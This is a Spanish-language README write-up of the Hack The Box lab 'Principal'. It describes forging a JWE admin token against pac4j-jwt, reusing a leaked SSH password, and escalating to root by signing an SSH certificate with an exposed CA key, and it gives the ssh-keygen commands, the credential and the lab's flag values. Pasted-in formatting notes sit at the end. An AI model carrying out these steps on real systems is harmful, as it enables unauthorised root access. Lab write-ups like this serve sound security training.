<!-- Banner principal -->
<div align="center">
  <img src="./PRINCIPAL.png" alt="Principal HTB Machine Banner" width="800"/>
</div>

<!-- Badges de identificación -->
<div align="center">
  <img src="https://img.shields.io/badge/Status-Resuelto-brightgreen" alt="Status"/>
  <img src="https://img.shields.io/badge/Dificultad-Medium-yellow" alt="Difficulty"/>
  <img src="https://img.shields.io/badge/Plataforma-Hack%20The%20Box-blue" alt="Platform"/>
  <img src="https://img.shields.io/badge/Write--up%20by-Cosm3No1de-orange" alt="Author"/>
</div>

# 🔐 Principal – Hack The Box (Medium)

> **Write-up técnico completo de la máquina `Principal`**  
> Explotación de `CVE-2026-29000` (pac4j-jwt JWE forgery) + escalada a `root` mediante certificados SSH.

---

## 📋 Índice

- [Vista rápida](#-vista-rápida)
- [¿Qué problema resuelve este repositorio?](#-qué-problema-resuelve-este-repositorio)
- [Tecnologías utilizadas](#-tecnologías-utilizadas)
- [Instalación y uso](#-instalación--uso)
- [Flags obtenidas](#-flags-obtenidas)
- [Lecciones aprendidas](#-lecciones-aprendidas)
- [Contacto](#-contacto)

---

## 🎯 Vista rápida

| Fase | Técnica principal |
|------|-------------------|
| 🔍 Enumeración | `nmap` → puerto `8080` abierto, servidor **Jetty** con cabecera `X-Powered-By: pac4j-jwt/6.0.3` |
| 🚪 Bypass de autenticación | Forja de token **JWE** con rol `ROLE_ADMIN` usando la clave pública JWKS (`/api/auth/jwks`) |
| 🔑 Acceso inicial | Credencial en texto plano `D3pl0y_$$H_Now42!` → acceso SSH como usuario `svc-deploy` |
| 👑 Escalada de privilegios | Abuso de **CA SSH**: clave privada en `/opt/principal/ssh/ca` → firma de certificado para `root` |

---

## 🧠 ¿Qué problema resuelve este repositorio?

Este repositorio demuestra competencias profesionales en:

- Reconocimiento de servicios web y detección de versiones vulnerables.
- Manipulación de tokens **JWT/JWE** y explotación de `CVE-2026-29000`.
- Extracción de credenciales sensibles desde endpoints de API autenticados.
- Uso de **certificados SSH** y mala configuración de una **Autoridad de Certificación (CA)** para escalar a `root`.

---

## 🛠️ Tecnologías utilizadas

| Herramienta / Librería | Propósito |
|------------------------|-----------|
| `nmap` | Escaneo de puertos y detección de servicios |
| `curl`, `jq` | Interacción con la API y parseo de JSON |
| `Python 3` + `jwcrypto`, `PyJWT`, `requests` | Forja del token JWE malicioso |
| `OpenSSH` (cliente/servidor) | Autenticación por certificado y escalada de privilegios |
| `gobuster`, `dirsearch` (opcional) | Enumeración de directorios ocultos |

---

## 📦 Instalación / Uso

```bash
# 1. Clona el repositorio
git clone https://github.com/Cosm3No1de/principal-htb.git
cd principal-htb

# 2. Instala las dependencias de Python
pip install -r requirements.txt

# 3. Ejecuta el script de forja de token JWE
python3 forge_jwe.py --url http://principal.htb:8080

# 4. Con la contraseña obtenida, conéctate por SSH y escala a root
ssh svc-deploy@principal.htb
# Contraseña: D3pl0y_$$H_Now42!

# Dentro de la máquina (pasos resumidos):
cd /opt/principal/ssh
ssh-keygen -t rsa -b 4096 -f /tmp/rootkey -N ""
ssh-keygen -s ca -I "exploit" -n root /tmp/rootkey.pub
ssh -i /tmp/rootkey root@localhost

🏆 Flags obtenidas
Flag	Valor
🟢 User flag	ae03f16d9cc263fb8e30ca26e7f3c03c
🔴 Root flag	d877755bf789aedddd17aec5865b3092
📸 Evidencia gráfica
<div align="center"> <img src="./principal.png" alt="Dashboard de Principal" width="600"/> <br/> <sub>Panel de administración accedido con el token JWE forjado.</sub> </div>
📝 Lecciones aprendidas

    Configuración de librerías JWT/JWE: nunca confiar en los valores por defecto; validar algoritmos permitidos y rotación de claves.

    Protección de claves privadas de CA: no deben ser legibles por cuentas de servicio o grupos no privilegiados.

    Autenticación por certificado SSH: es muy segura si la CA se gestiona en un entorno aislado y con controles estrictos.

📄 Licencia

MIT – uso libre para fines educativos y de investigación.
🤝 Contribuciones

Las sugerencias y mejoras son bienvenidas. Abre un issue o un pull request.

⭐ Si este contenido te resultó útil, no olvides darle una estrella.
📬 Contacto

¿Preguntas, comentarios o deseas conectar profesionalmente?
🔗 Visita mi portafolio de enlaces: https://linktr.ee/cosmenoide

*Write-up realizado por Cosm3No1de – Ethical Hacker & Cybersecurity Enthusiast.*
text


### ✨ Mejoras visuales incorporadas:

- **Banner centrado** con la imagen `principal.png` (ancho 800px).
- **Badges** de estado, dificultad, plataforma y autor.
- **Emojis** en títulos y tabla de vista rápida.
- **Tabla de tecnologías** para claridad.
- **Estructura con índice** para navegación.
- **Código resaltado** (bash) y bloques de comandos.
- **Contacto final** con enlace a `https://linktr.ee/cosmenoide`.


